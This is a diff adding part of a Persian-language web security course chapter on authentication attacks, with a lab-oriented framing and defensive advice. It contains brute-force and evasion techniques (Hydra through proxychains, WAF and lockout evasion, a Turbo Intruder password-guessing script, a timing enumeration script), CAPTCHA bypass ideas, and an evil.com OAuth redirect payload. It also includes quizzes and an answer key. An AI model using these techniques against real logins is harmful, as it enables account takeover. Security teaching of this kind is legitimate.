+awk -v date=&quot;$(date -d &#39;1 hour ago&#39; +%d/%b/%Y:%H)&quot; &#39;$4 ~ date &amp;&amp; $9 == 401 {print $1}&#39; $LOG | \
+    sort | uniq -c | sort -rn | head -10
+
+# ۳) Alert در Slack (اختیاری)
+# اگر IPی بیشتر از 100 بار خطا داد:
+# curl -X POST $SLACK_WEBHOOK -d &#39;{&quot;text&quot;:&quot;Brute Force detected from IP...&quot;}&#39;
+</pre>
+                    </div>
+
+                    <div class="callout co-tip">
+                        <strong>💡 قاعده «Zero Trust Authentication»:</strong>
+                        <ul style="margin: 6px 0 0 0;">
+                            <li>هیچ رمزی را نباید «امن» فرض کرد</li>
+                            <li>هر ورود را باید جدی گرفت (لاگ، Geo-Location، دستگاه)</li>
+                            <li>هر تغییری در Session را باید تأیید کرد (تغییر رمز، تغییر ایمیل)</li>
+                            <li>هیچ Session را نباید «ابدی» نگه داشت</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- بخش ۹ -->
+                <div class="section-part" id="part-09">
+                    <h3>۹. نکات حرفه‌ای و اشتباهات رایج</h3>
+
+                    <div class="do-dont">
+                        <div class="do-box">
+                            <h6>✅ کارهای حرفه‌ای:</h6>
+                            <ul>
+                                <li>اول Account Enumeration، بعد Brute Force</li>
+                                <li>شروع با Password Spraying (کمتر noisy)</li>
+                                <li>Snapshot قبل از هر حمله</li>
+                                <li>مستندسازی دقیق هر تلاش (تاریخ، ساعت، تعداد)</li>
+                                <li>چک Rate Limit قبل از شروع (با 5-10 درخواست تست)</li>
+                                <li>استفاده از Hydra با <code>-t 4</code> برای فرار از WAF</li>
+                                <li>Wordlist هدفمند (مخصوص تکنولوژی هدف)</li>
+                                <li>بررسی همه endpointها (API، mobile، legacy)</li>
+                            </ul>
+                        </div>
+                        <div class="dont-box">
+                            <h6>❌ دام‌های رایج:</h6>
+                            <ul>
+                                <li>اجرای Brute Force روی هدف غیرمجاز (جرم!)</li>
+                                <li>استفاده از rockyou.txt کامل روی هدف کوچک (noisy + کند)</li>
+                                <li>نادیده گرفتن Lockout (خطر قفل اکانت واقعی!)</li>
+                                <li>فراموش کردن تغییر User-Agent</li>
+                                <li>تلاش از یک IP ثابت (blocked می‌شود)</li>
+                                <li>اعتماد به پیام‌های HTTP (بعضی وقت‌ها مخفی می‌کنند)</li>
+                                <li>نادیده گرفتن Rate Limit (خطر WAF Block)</li>
+                                <li>فراموش کردن چک گذرواژه‌های قدیمی (اگر 3 ماه عوض نشده)</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <h5>🎓 نکات پیشرفته:</h5>
+
+                    <h6>۱) افزایش سرعت Brute Force با Proxy Chain:</h6>
+<pre class="code-box"># اگر سرور Rate Limit بر اساس IP دارد:
+# از چرخش Proxy استفاده کنید
+
+# ۱) لیست Proxyهای SOCKS5
+cat proxies.txt
+# socks5://1.2.3.4:1080
+# socks5://5.6.7.8:1080
+# ...
+
+# ۲) اجرای Hydra از طریق proxychains:
+proxychains4 hydra -l admin -P wordlist.txt \
+    -t 1 \
+    192.168.56.20 http-post-form &quot;/login/:username=^USER^&amp;password=^PASS^:F=Invalid&quot;
+
+# نکته: Hydra با proxychains کند است (per-request proxy rotation ندارد)
+# راه بهتر: Burp با افزونه Turbo Intruder + IP Rotation
+</pre>
+
+                    <h6>۲) حمله به Login API (پشت CAPTCHA):</h6>
+<pre class="code-box"># اگر فرم اصلی CAPTCHA دارد، به دنبال API بگردید:
+# - /api/v1/login
+# - /api/auth
+# - /mobile/login
+# - /graphql
+
+# در Burp، همه درخواست‌ها را چک کنید (نه فقط فرم ظاهری)
+
+# یا از CAPTCHA Bypass Techniques:
+# - Reuse CAPTCHA Response
+# - Replay CAPTCHA Token
+# - Find CAPTCHA-less Endpoint
+</pre>
+
+                    <h6>۳) حمله به OAuth Flows:</h6>
+<pre class="code-box"># اگر اپ «Login with Google/GitHub» دارد:
+
+# ۱) Weak State Parameter → CSRF روی OAuth
+# ۲) Redirect URI Manipulation
+#    redirect_uri=https://evil.com/oauth-callback
+# ۳) Token Leakage in Referrer
+# ۴) Implicit Flow Attacks
+# ۵) Account Takeover via Email Change
+</pre>
+
+                    <h6>۴) Timing Attack روی Username Enumeration:</h6>
+<pre class="code-box"># ابزار: Burp + Custom Script
+# ۱) 100 درخواست با user=admin (موجود) → میانگین زمان T1
+# ۲) 100 درخواست با user=xyzvbn (ناموجود) → میانگین زمان T2
+# ۳) اگر T1 و T2 تفاوت معنی‌دار داشتند (>50ms)، Enumeration ممکن است
+
+# اسکریپت Python:
+import statistics, requests, time
+
+def time_requests(username, count=100):
+    times = []
+    for _ in range(count):
+        start = time.time()
+        requests.post(&quot;http://target.com/login/&quot;,
+                      data={&quot;username&quot;: username, &quot;password&quot;: &quot;wrong&quot;})
+        times.append(time.time() - start)
+    return statistics.mean(times)
+
+t1 = time_requests(&quot;admin&quot;)
+t2 = time_requests(&quot;nonexistent_xyz123&quot;)
+print(f&quot;admin: {t1:.3f}s, nonexistent: {t2:.3f}s, diff: {abs(t1-t2)*1000:.1f}ms&quot;)
+</pre>
+
+                    <h6>۵) حمله به Remember Me:</h6>
+<pre class="code-box"># کوکی Remember Me معمولاً شامل:
+# - user_id
+# - token / hash
+# - expiration
+
+# حملات:
+# ۱) اگر token قابل پیش‌بینی است (مثل hash(user_id + static_salt))
+# ۲) اگر token پس از logout باطل نمی‌شود
+# ۳) اگر token در دیتابیس ذخیره نمی‌شود (stateless)
+
+# در Burp، کوکی Remember Me را دیکد و تحلیل کنید
+</pre>
+
+                    <h6>۶) ابزار Burp Turbo Intruder:</h6>
+<pre class="code-box"># برای Brute Force سریع و حرفه‌ای، افزونه Turbo Intruder نصب کنید:
+# BApp Store → Turbo Intruder
+
+# کد Python داخل Turbo Intruder:
+def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=20,
+        requestsPerConnection=100,
+        pipeline=False
+    )
+    for password in open(&#39;/usr/share/wordlists/rockyou.txt&#39;, encoding=&#39;utf-8&#39;, errors=&#39;ignore&#39;):
+        engine.queue(target.req, password.rstrip())
+
+def handleResponse(req, interesting):
+    if &#39;Welcome&#39; in req.response:
+        table.add(req)
+</pre>
+                </div>
+
+                <!-- بخش ۱۰ -->
+                <div class="section-part" id="part-10">
+                    <h3>۱۰. پرسش و پاسخ و رفع اشکال</h3>
+
+                    <div class="qa-box">
+                        <h5>❓ سوالات متداول این فصل:</h5>
+
+                        <details>
+                            <summary>تفاوت Brute Force با Password Spraying چیست؟ کدام بهتر است؟</summary>
+                            <p>
+                                <strong>Brute Force:</strong> یک نام کاربری، هزاران رمز → سریع قفل می‌شود اگر Lockout فعال باشد.<br>
+                                <strong>Password Spraying:</strong> هزاران نام کاربری، یک رمز رایج → Lockout را دور می‌زند.<br>
+                                <strong>توصیه:</strong> اول Spraying (کم noisy، کمتر detect)، بعد اگر جواب نداد، Brute Force روی کاربران مهم.
+                            </p>
+                        </details>
+
+                        <details>
+                            <summary>چرا Django Admin با Hydra کار نمی‌کند؟</summary>
+                            <p>
+                                Django Admin از <strong>CSRF Token</strong> استفاده می‌کند و Hydra نمی‌تواند Token را استخراج کند.
+                                سه راه‌حل:<br>
+                                ۱) از Burp Intruder با Session Handling Rules استفاده کنید<br>
+                                ۲) یک endpoint لاگین ساده بدون CSRF بسازید (فقط در lab)<br>
+                                ۳) از ابزارهایی مثل <code>patator</code> یا اسکریپت Python سفارشی که Token را استخراج کند
+                            </p>
+                        </details>
+
+                        <details>
+                            <summary>چرا پیام «Too many attempts» می‌گیرم؟</summary>
+                            <p>
+                                Rate Limit یا Lockout فعال است. راه‌حل‌ها:
+                                <br>• سرعت Hydra را کاهش دهید: <code>-t 1 -W 5</code>
+                                <br>• بین تلاش‌ها Delay اضافه کنید
+                                <br>• از Proxy Chain استفاده کنید
+                                <br>• بعد از Lockout، ۳۰ دقیقه صبر کنید یا Snapshot را برگردانید
+                            </p>
+                        </details>
+
+                        <details>
+                            <summary>حمله JWT به اپلیکیشن من کار نمی‌کند. چرا؟</summary>
+                            <p>
+                                سه دلیل رایج:
+                                <br>• سرور شما whitelist Algorithms دارد (خوب است!)
+                                <br>• از HS256 با کلید قوی استفاده می‌کنید (کشف نشدنی)
+                                <br>• KID header وجود ندارد (پس KID Injection کار نمی‌کند)
+                                <br>راه‌حل: کد سرور را بررسی کنید، یا از <code>jwt_tool -M at</code> برای تحلیل خودکار استفاده کنید.
+                            </p>
+                        </details>
+
+                        <details>
+                            <summary>چطور از IP خودم محافظت کنم در Brute Force؟</summary>
+                            <p>
+                                ابتدا از قانونی بودن هدف مطمئن شوید. سپس:
+                                <br>• از VPN یا Tor استفاده کنید (کند می‌شود)
+                                <br>• از Proxy Chain چرخشی استفاده کنید
+                                <br>• اگر روی lab خودتان هستید، IP واقعی مشکلی ندارد
+                                <br>• از User-Agent و هدرهای واقعی مرورگر استفاده کنید
+                            </p>
+                        </details>
+
+                        <details>
+                            <summary>MFA رو چطور برای اپ خودم امن کنم؟</summary>
+                            <p>
+                                چک‌لیست:
+                                <br>• MFA را در هر درخواست محافظت‌شده چک کنید (نه فقط در login)
+                                <br>• Rate Limit روی endpoint OTP (5 درخواست در دقیقه)
+                                <br>• OTP یک‌بار مصرف باشد (TOTP استاندارد)
+                                <br>• از Push Notification با Number Matching استفاده کنید (MFA Fatigue نمی‌گیرد)
+                                <br>• Recovery Codes را طولانی (32+ char) و یک‌بار مصرف کنید
+                                <br>• لاگ همه MFA events + Alert روی موارد مشکوک
+                            </p>
+                        </details>
+                    </div>
+
+                    <h5>🐛 خطاهای رایج و رفع آن‌ها:</h5>
+                    <table class="objectives-table">
+                        <thead>
+                            <tr><th>خطا / مشکل</th><th>علت</th><th>راه‌حل</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>hydra: unknown service</code></td>
+                                <td>نام سرویس اشتباه یا ماژول نصب نیست</td>
+                                <td><code>hydra -U &lt;service&gt;</code> را چک کنید</td>
+                            </tr>
+                            <tr>
+                                <td>Burp Intruder: <code>Request rate too high</code></td>
+                                <td>سرعت بیش از حد مجاز</td>
+                                <td>Options → Request Engine → Throttle بین درخواست‌ها</td>
+                            </tr>
+                            <tr>
+                                <td>Hydra: <code>CSRF token invalid</code></td>
+                                <td>CSRF Protection فعال</td>
+                                <td>به Burp Intruder با Macros کوچ کنید</td>
+                            </tr>
+                            <tr>
+                                <td>Wordlist فایل نیست</td>
+                                <td>rockyou.txt در حالت .gz است</td>
+                                <td><code>sudo gunzip -k rockyou.txt.gz</code></td>
+                            </tr>
+                            <tr>
+                                <td>JWT: <code>Signature verification failed</code></td>
+                                <td>الگوریتم اشتباه یا کلید غلط</td>
+                                <td>الگوریتم را تحلیل کنید (نگاه در jwt.io)</td>
+                            </tr>
+                            <tr>
+                                <td>Session Hijacking کار نمی‌کند</td>
+                                <td>Cookie HttpOnly فعال است</td>
+                                <td>روی Django lab، HttpOnly را موقتاً غیرفعال کنید</td>
+                            </tr>
+                            <tr>
+                                <td>Lockout فعال شد و به هدف دسترسی ندارم</td>
+                                <td>AXES یا django-defender نصب است</td>
+                                <td>Snapshot برگردانید یا از پنل admin قفل را بردارید</td>
+                            </tr>
+                            <tr>
+                                <td>Password Reset Token قابل Brute Force نیست</td>
+                                <td>Token به‌اندازه کافی تصادفی است</td>
+                                <td>سراغ Host Header Injection یا Reset Token Leakage بروید</td>
+                            </tr>
+                            <tr>
+                                <td>MFA Bypass با Race Condition کار نمی‌کند</td>
+                                <td>سرور Synchronization دارد</td>
+                                <td>سراغ Response Manipulation یا Direct Endpoint بروید</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- بخش ۱۱ -->
+                <div class="section-part" id="part-11">
+                    <h3>۱۱. جمع‌بندی و نکات طلایی</h3>
+
+                    <div class="summary-box">
+                        <h5>📌 خلاصه نکات کلیدی این فصل:</h5>
+                        <ul>
+                            <li>🔹 <strong>Authentication هدف شماره ۱</strong> است — هر چیز دیگری پشت این دروازه است.</li>
+                            <li>🔹 <strong>Account Enumeration اول</strong>، بعد Brute Force — کار حرفه‌ای همین است.</li>
+                            <li>🔹 <strong>Password Spraying</strong> مؤثرتر از Brute Force خالص (Lockout را دور می‌زند).</li>
+                            <li>🔹 <strong>Hydra برای CLI، Burp Intruder برای پیچیده‌ها</strong> — هر کدام جای خودش.</li>
+                            <li>🔹 <strong>Session Hijacking</strong> فقط وقتی کار می‌کند که Cookie امن نباشد (بدون HttpOnly/Secure).</li>
+                            <li>🔹 <strong>MFA Bypass</strong> ۶ تکنیک اصلی دارد — بیشتر حملات واقعی از Response Manipulation استفاده می‌کنند.</li>
+                            <li>🔹 <strong>JWT Attacks</strong>: None Algorithm و Key Confusion رایج‌ترین‌ها هستند.</li>
+                            <li>🔹 <strong>Password Reset Flaws</strong> یکی از پرتکرارترین باگ‌های Bug Bounty است.</li>
+                            <li>🔹 <strong>دفاع چندلایه</strong>: Rate Limit + Lockout + CAPTCHA + 2FA + Monitoring.</li>
+                            <li>🔹 <strong>django-axes و django-ratelimit</strong> نصب کنید — بهترین دفاع در Django.</li>
+                        </ul>
+                    </div>
+
+                    <h5>🎓 چرا این فصل، پل بین Recon و حملات عمیق است؟</h5>
+                    <p>
+                        در فصل ۳ و ۴ یاد گرفتید هدف را بشناسید. در این فصل، اولین دروازه را باز می‌کنید.
+                        اگر این دروازه باز شود:
+                    </p>
+                    <ul>
+                        <li>به SQLi (فصل ۶) می‌رسید — برای استخراج داده بیشتر</li>
+                        <li>به XSS (فصل ۷) می‌رسید — برای سرقت نشست admin</li>
+                        <li>به IDOR (فصل ۹) می‌رسید — برای دسترسی به داده‌های همه</li>
+                        <li>به RCE (فصل ۱۰ و ۱۱) می‌رسید — برای کنترل کامل سرور</li>
+                    </ul>
+                    <p>
+                        Authentication، <strong>دروازه اصلی</strong> است. حتی اگر همه آسیب‌پذیری‌های دیگر بسته باشند،
+                        یک رمز ضعیف می‌تواند همه چیز را از بین ببرد.
+                    </p>
+
+                    <div class="callout co-tip">
+                        <strong>📎 پل به فصل بعد:</strong>
+                        در فصل ۶، وارد <strong>SQL Injection</strong> می‌شویم — پادشاه آسیب‌پذیری‌ها.
+                        با ابزار قدرتمند <strong>sqlmap</strong>، دیتابیس کامل هدف را استخراج می‌کنیم و
+                        یاد می‌گیریم چطور در کد Django از آن جلوگیری کنیم.
+                    </div>
+                </div>
+
+                <!-- بخش ۱۲ -->
+                <div class="section-part" id="part-12">
+                    <h3>۱۲. خودارزیابی و آزمونک</h3>
+
+                    <div class="self-assessment">
+                        <h5>⭐ چک‌لیست خودارزیابی (صادق باشید):</h5>
+                        <ul class="checklist">
+                            <li>تفاوت Authentication با Authorization را توضیح می‌دهم.</li>
+                            <li>می‌توانم با Hydra روی یک فرم POST لاگین Brute Force کنم.</li>
+                            <li>Password Spraying را از Brute Force خالص تشخیص می‌دهم.</li>
+                            <li>Session Hijacking و Session Fixation را می‌شناسم.</li>
+                            <li>۳ تکنیک دور زدن MFA را می‌توانم اجرا کنم.</li>
+                            <li>JWT را می‌توانم Decode و تحلیل کنم.</li>
+                            <li>حمله None Algorithm روی JWT را می‌شناسم.</li>
+                            <li>Password Reset Flaws را در یک وب‌اپ تست می‌کنم.</li>
+                            <li>django-axes و django-ratelimit را نصب و تنظیم کردم.</li>
+                            <li>همه دفاع‌های این فصل را در پروژه lab خودم پیاده کرده‌ام.</li>
+                        </ul>
+                    </div>
+
+                    <h5>📝 آزمونک فصل (۵ سؤال):</h5>
+
+                    <div class="quiz-question">
+                        <strong>۱.</strong> Password Spraying چطور Lockout را دور می‌زند؟
+                        <ul style="list-style: none; padding-right: 0;">
+                            <li>الف) رمز را از دیتابیس می‌خواند</li>
+                            <li>ب) از یک رمز روی چند نام کاربری استفاده می‌کند (Lockout روی نام کاربری است نه IP)</li>
+                            <li>ج) CAPTCHA را دور می‌زند</li>
+                            <li>د) همیشه جواب می‌دهد</li>
+                        </ul>
+                    </div>
+
+                    <div class="quiz-question">
+                        <strong>۲.</strong> کدام کوکی از XSS در امان است؟
+                        <ul style="list-style: none; padding-right: 0;">
+                            <li>الف) HttpOnly</li>
+                            <li>ب) Secure</li>
+                            <li>ج) SameSite</li>
+                            <li>د) همه موارد</li>
+                        </ul>
+                    </div>
+
+                    <div class="quiz-question">
+                        <strong>۳.</strong> حمله «None Algorithm» روی JWT چه می‌کند؟
+                        <ul style="list-style: none; padding-right: 0;">
+                            <li>الف) امضا را از بین می‌برد</li>
+                            <li>ب) Payload را حذف می‌کند</li>
+                            <li>ج) Header را به alg:none تغییر می‌دهد (و سرور اشتباهاً قبول می‌کند)</li>
+                            <li>د) JWT را طولانی‌تر می‌کند</li>
+                        </ul>
+                    </div>
+
+                    <div class="quiz-question">
+                        <strong>۴.</strong> کدام دفاع مؤثرترین است در برابر Brute Force؟
+                        <ul style="list-style: none; padding-right: 0;">
+                            <li>الف) رمز طولانی</li>
+                            <li>ب) ترکیب Rate Limiting + Account Lockout + CAPTCHA + 2FA</li>
+                            <li>ج) تغییر پورت SSH</li>
+                            <li>د) استفاده از HTTPS</li>
+                        </ul>
+                    </div>
+
+                    <div class="quiz-question">
+                        <strong>۵.</strong> حمله MFA Fatigue چیست؟
+                        <ul style="list-style: none; padding-right: 0;">
+                            <li>الف) حدس زدن کد ۶ رقمی</li>
+                            <li>ب) ارسال مکرر درخواست تأیید تا قربانی از خستگی Accept کند</li>
+                            <li>ج) دزدیدن کد از پیامک</li>
+                            <li>د) دور زدن با Response Manipulation</li>
+                        </ul>
+                    </div>
+
+                    <details>
+                        <summary>✅ پاسخ‌های صحیح</summary>
+                        <div style="padding: 10px 16px 14px;">
+                            <p><strong>۱. ب</strong> — Password Spraying روی نام‌های کاربری زیاد با رمز کم کار می‌کند و چون هر اکانت فقط ۱-۲ تلاش می‌گیرد، Lockout فعال نمی‌شود.</p>
+                            <p><strong>۲. الف</strong> — HttpOnly کوکی را از JavaScript مخفی می‌کند؛ XSS نمی‌تواند آن را بخواند.</p>
+                            <p><strong>۳. ج</strong> — حمله None Algorithm با تغییر alg به none و حذف امضا، اگر سرور whitelist نداشته باشد، توکن را قبول می‌کند.</p>
+                            <p><strong>۴. ب</strong> — ترکیب چندلایه مؤثرترین است (هیچ لایه‌ای تنها کافی نیست).</p>
+                            <p><strong>۵. ب</strong> — MFA Fatigue (یا Push Bombing) با اسپم کردن درخواست MFA، قربانی را خسته می‌کند تا Accept بزند.</p>
+                        </div>
+                    </details>
+                </div>
+
+                <!-- بخش ۱۳ -->
+                <div class="section-part" id="part-13">
+                    <h3>۱۳. پروژه هفتگی (تمرین مستقل)</h3>
+
+                    <div class="weekly-project">
+                        <h5>🏆 پروژه هفتگی: «زنجیره کامل حمله به احراز هویت»</h5>
+
+                        <p><strong>هدف:</strong> یک سناریوی کامل از Enumeration تا دسترسی و دفاع، روی Django lab خودتان.</p>
+
+                        <h6>مراحل:</h6>
+                        <ol>
+                            <li>Snapshot از هر VM بگیرید.</li>
+                            <li>یک اپ Django با این ویژگی‌ها بسازید:
+                                <ul>
+                                    <li>صفحه لاگین ساده (بدون CSRF برای شروع)</li>
+                                    <li>صفحه Reset Password</li>
+                                    <li>صفحه ثبت‌نام</li>
+                                    <li>یک پنل ادمین ساده</li>
+                                </ul>
+                            </li>
+                            <li><strong>Account Enumeration</strong> — کشف نام کاربری‌های معتبر.</li>
+                            <li><strong>Password Spraying</strong> — با ۵ رمز پرتکرار روی ۱۰ نام کاربری.</li>
+                            <li><strong>Brute Force</strong> — روی کاربر ادمین با ۱۰۰ رمز.</li>
+                            <li><strong>Session Hijacking</strong> — با غیرفعال کردن HttpOnly و XSS.</li>
+                            <li><strong>JWT Attack</strong> — اگر از DRF استفاده می‌کنید، حمله None Algorithm.</li>
+                            <li><strong>Password Reset Attack</strong> — با Host Header Injection.</li>
+                            <li><strong>پیاده‌سازی دفاع</strong> — django-axes + django-ratelimit + تنظیمات Session.</li>
+                            <li><strong>تست مجدد</strong> — حمله‌ها باید شکست بخورند.</li>
+                        </ol>
+
+                        <h6>خروجی مورد انتظار:</h6>
+                        <ul>
+                            <li>📄 گزارش کامل <code>auth-attack-report.md</code></li>
+                            <li>🛠️ کد Django آسیب‌پذیر (vulnerable branch)</li>
+                            <li>🛡️ کد Django امن (secure branch)</li>
+                            <li>📊 جدول قبل/بعد از دفاع</li>
+                            <li>📸 اسکرین‌شات‌های Burp + login موفق</li>
+                            <li>🎯 CVSS Score برای هر حمله</li>
+                        </ul>
+
+                        <p style="margin-top: 12px;"><strong>💼 نکته:</strong> این گزارش، قطعه سوم پورتفولیوی شماست. در مصاحبه، این جمله قوی است: «من یک پنتست کامل روی Django انجام دادم و همه دفاع‌های لازم را هم پیاده کردم.»</p>
+                    </div>
+                </div>
+
+                <!-- بخش ۱۴ -->
+                <div class="section-part" id="part-14">
+                    <h3>۱۴. منابع تکمیلی و گام بعدی</h3>
+
+                    <div class="resources-box">
+                        <h5>📚 منابع ضروری:</h5>
+                        <table class="objectives-table">
+                            <thead>
+                                <tr><th>منبع</th><th>کاربرد</th><th>لینک</th></tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>OWASP Authentication Cheat Sheet</td>
+                                    <td>راهنمای جامع احراز هویت امن</td>
+                                    <td><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank" rel="noopener">cheatsheetseries.owasp.org</a></td>
+                                </tr>
+                                <tr>
+                                    <td>PortSwigger Auth Labs</td>
+                                    <td>آزمایشگاه‌های تعاملی (رایگان)</td>
+                                    <td><a href="https://portswigger.net/web-security/authentication" target="_blank" rel="noopener">portswigger.net/web-security/authentication</a></td>
+                                </tr>
+                                <tr>
+                                    <td>PortSwigger JWT Labs</td>
+                                    <td>۷ آزمایشگاه JWT رایگان</td>
+                                    <td><a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">portswigger.net/web-security/jwt</a></td>
+                                </tr>
+                                <tr>
+                                    <td>Hydra Docs</td>
+                                    <td>مستندات کامل Hydra</td>
+                                    <td><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">github.com/vanhauser-thc/thc-hydra</a></td>
+                                </tr>
+                                <tr>
+                                    <td>jwt_tool GitHub</td>
+                                    <td>ابزار حمله JWT</td>
+                                    <td><a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener">github.com/ticarpi/jwt_tool</a></td>
+                                </tr>
+                                <tr>
+                                    <td>django-axes Docs</td>
+                                    <td>Rate Limiting در Django</td>
+                                    <td><a href="https://django-axes.readthedocs.io/" target="_blank" rel="noopener">django-axes.readthedocs.io</a></td>
+                                </tr>
+                                <tr>
+                                    <td>SimpleJWT Docs</td>
+                                    <td>پیاده‌سازی امن JWT در DRF</td>
+                                    <td><a href="https://django-rest-framework-simplejwt.readthedocs.io/" target="_blank" rel="noopener">django-rest-framework-simplejwt</a></td>
+                                </tr>
+                                <tr>
+                                    <td>HaveIBeenPwned</td>
+                                    <td>چک رمزهای لو رفته</td>
+                                    <td><a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">haveibeenpwned.com</a></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <h5>📖 کتاب‌های توصیه‌شده:</h5>
+                    <ul>
+                        <li>📕 <strong>The Web Application Hacker's Handbook</strong> — فصل ۶ (Attacking Authentication)</li>
+                        <li>📗 <strong>Real-World Bug Hunting</strong> — Vickie Li (کیس‌های واقعی Auth Bug)</li>
+                        <li>📘 <strong>Bug Bounty Bootcamp</strong> — فصل ۱۲ (Auth Vulnerabilities)</li>
+                        <li>📙 <strong>Web Hacking Arsenal</strong> — Rafay Baloch (فصل Authentication Attacks)</li>
+                        <li>📓 <strong>Hacking APIs</strong> — Corey Ball (فصل JWT Attacks)</li>
+                    </ul>
+
+                    <h5>🎯 گام بعدی (فصل ۶):</h5>
+                    <p>در فصل ۶، وارد <strong>SQL Injection</strong> می‌شویم — پادشاه آسیب‌پذیری‌ها:</p>
+                    <ul>
+                        <li>💉 <strong>Union-based SQLi</strong> — استخراج داده در یک درخواست</li>
+                        <li>💉 <strong>Boolean-based Blind</strong> — حمله کور با سؤال بله/خیر</li>
+                        <li>💉 <strong>Time-based Blind</strong> — حمله با تأخیر زمانی</li>
+                        <li>💉 <strong>Out-of-Band SQLi</strong> — سرقت داده از طریق DNS</li>
+                        <li>💉 <strong>sqlmap کامل</strong> — از کشف تا Dump کل دیتابیس</li>
+                        <li>🛡️ <strong>Prepared Statements</strong> و ORM در Django</li>
+                    </ul>
+                    <p>در پایان فصل ۶، شما قادر خواهید بود <strong>دیتابیس کامل یک هدف شبیه‌سازی‌شده را استخراج کنید</strong> و بفهمید چطور در کد خودتان از آن جلوگیری کنید.</p>
+
+                    <div class="callout co-tip">
+                        <strong>💡 تمرین اختیاری این هفته:</strong>
+                        در PortSwigger Web Security Academy، این labهای رایگان را کامل کنید:
+                        <ul style="margin: 6px 0 0 0;">
+                            <li><strong>Username enumeration via different responses</strong></li>
+                            <li><strong>Password reset broken logic</strong></li>
+                            <li><strong>JWT authentication bypass via unverified signature</strong></li>
+                        </ul>
+                        این ۳ lab، پیش‌نیاز عالی برای فصل ۶ هستند.
+                    </div>
+
+                    <h5>🎯 آماده برای فصل بعدی؟</h5>
+                    <p>قبل از رفتن به فصل ۶، مطمئن شوید:</p>
+                    <ul class="checklist">
+                        <li>auth-attack-report.md برای Django lab کامل است</li>
+                        <li>django-axes نصب و پیکربندی شده</li>
+                        <li>Snapshot از حالت پیش از حمله دارید (برای برگشت)</li>
+                        <li>Burp Project برای این فصل ذخیره شده</li>
+                        <li>Wordlistهای Seclists روی Kali به‌روز هستند</li>
+                    </ul>
+                </div>
+
+                <div class="done-bar">
+                    <span style="font-weight:800;color:#7ee787">🎯 این فصل را خواندید؟ پیشرفت خود را ذخیره کنید:</span><br>
+                    <button id="mark-done" data-chapter="ch-05" type="button">✔️ این فصل را تمام کردم</button>
+                </div>
+
+                <div class="pager">
+                    <a href="../chapter-04/index.html" id="prev-link">➜ فصل قبل</a>
+                    <a href="../../index.html">🗂️ فهرست فصل‌ها</a>
+                    <a href="../chapter-06/index.html" id="next-link">فصل بعد ➜</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="site-footer">
+        <div class="container">
+            <p>🛡️ دوره تخصصی امنیت وب — © ۱۴۰۵</p>
+            <p style="font-size:.85rem;color:var(--muted)">این محتوا صرفاً برای آموزش در محیط آزمایشگاه ایزوله تهیه شده است. مسئولیت استفاده نادرست بر عهده کاربر است.</p>
+        </div>
+    </footer>
+
+    <script src="../../assets/js/script.js"></script>
+</body>
+</html>
